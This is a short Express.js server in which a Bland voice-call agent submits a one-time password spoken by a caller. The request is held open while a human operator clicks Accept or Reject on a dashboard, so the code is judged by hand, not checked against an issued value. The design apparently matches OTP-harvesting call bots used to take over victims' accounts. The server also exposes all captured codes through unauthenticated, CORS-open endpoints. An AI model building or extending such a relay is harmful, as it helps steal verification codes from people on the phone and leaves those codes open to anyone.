const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const pending = {};
const waiters = {}; // holds resolve functions for long-polling

// Bland calls this when caller speaks OTP
// We hold the response open until human clicks Accept/Reject (up to 55 seconds)
app.post('/submit-otp', (req, res) => {
  const { session_id, otp } = req.body;
  if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });

  pending[session_id] = { otp, status: 'pending', timestamp: Date.now() };

  // Wait up to 55 seconds for a human decision
  const timeout = setTimeout(() => {
    delete waiters[session_id];
    // If no decision made, default to rejected
    if (pending[session_id] && pending[session_id].status === 'pending') {
      pending[session_id].status = 'rejected';
    }
    res.json({ verification_status: 'rejected', message: 'Verification timed out' });
  }, 55000);

  // Store the resolve so /decide can trigger it
  waiters[session_id] = (decision) => {
    clearTimeout(timeout);
    delete waiters[session_id];
    res.json({
      verification_status: decision,
      message: decision === 'confirmed' ? 'OTP verified successfully' : 'OTP verification failed'
    });
  };
});

// Dashboard calls this when you click Accept/Reject
app.post('/decide', (req, res) => {
  const { session_id, decision } = req.body;
  if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });

  pending[session_id].status = decision;

  // If Bland is still waiting, respond to it now
  if (waiters[session_id]) {
    waiters[session_id](decision);
  }

  res.json({ success: true });
});

app.get('/pending', (req, res) => {
  res.json(pending);
});

app.get('/status/:session_id', (req, res) => {
  const entry = pending[req.params.session_id];
  if (!entry) return res.json({ status: 'not_found' });
  res.json({ status: entry.status, otp: entry.otp });
});

app.listen(3000, () => console.log('Server running on port 3000'));
